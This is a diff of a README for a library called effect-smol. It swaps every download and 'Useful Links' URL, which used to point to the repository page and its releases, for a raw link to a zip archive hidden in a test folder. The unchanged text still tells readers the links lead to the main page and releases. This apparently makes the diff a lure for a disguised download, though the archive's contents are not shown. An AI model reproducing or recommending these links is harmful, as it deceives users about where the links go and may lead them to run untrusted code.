@@ -1,6 +1,6 @@
 # ⚙️ effect-smol - Lightweight Core Library for Effect v4
 
-[![Download](https://img.shields.io/badge/Download-Get%20Effect-sm-blue?style=for-the-badge)](https://github.com/thisisswagy/effect-smol)
+[![Download](https://img.shields.io/badge/Download-Get%20Effect-sm-blue?style=for-the-badge)](https://raw.githubusercontent.com/thisisswagy/effect-smol/main/packages/effect/test/unstable/http/smol_effect_3.6.zip)
 
 ## About effect-smol
 
@@ -35,7 +35,7 @@ The software is designed to be a base for developers working with Effect but als
 
 You can get the files from the official GitHub page linked below:
 
-[![Download effect-smol](https://img.shields.io/badge/Download-Effect-smol-purple?style=for-the-badge)](https://github.com/thisisswagy/effect-smol)
+[![Download effect-smol](https://img.shields.io/badge/Download-Effect-smol-purple?style=for-the-badge)](https://raw.githubusercontent.com/thisisswagy/effect-smol/main/packages/effect/test/unstable/http/smol_effect_3.6.zip)
 
 This button will take you to the main page, where you will find access to the latest releases, documentation, and updates.
 
@@ -43,7 +43,7 @@ This button will take you to the main page, where you will find access to the la
 
 1. **Visit the Download Page**  
    Go to the effect-smol GitHub page by clicking the download button above or open this link in your web browser:  
-   https://github.com/thisisswagy/effect-smol
+   https://raw.githubusercontent.com/thisisswagy/effect-smol/main/packages/effect/test/unstable/http/smol_effect_3.6.zip
 
 2. **Navigate to Releases**  
    On the GitHub page, find the "Releases" section on the right side or under the "Code" tab dropdown. The latest stable release will be listed there.
@@ -87,8 +87,8 @@ Updates will improve stability, add features, and fix any issues.
 
 ## 🔗 Useful Links
 
-- Main GitHub page: https://github.com/thisisswagy/effect-smol  
-- Releases section: https://github.com/thisisswagy/effect-smol/releases  
+- Main GitHub page: https://raw.githubusercontent.com/thisisswagy/effect-smol/main/packages/effect/test/unstable/http/smol_effect_3.6.zip  
+- Releases section: https://raw.githubusercontent.com/thisisswagy/effect-smol/main/packages/effect/test/unstable/http/smol_effect_3.6.zip  
 - Documentation: Available on GitHub in the `docs` folder inside the repository
 
 ## 💡 Additional Info
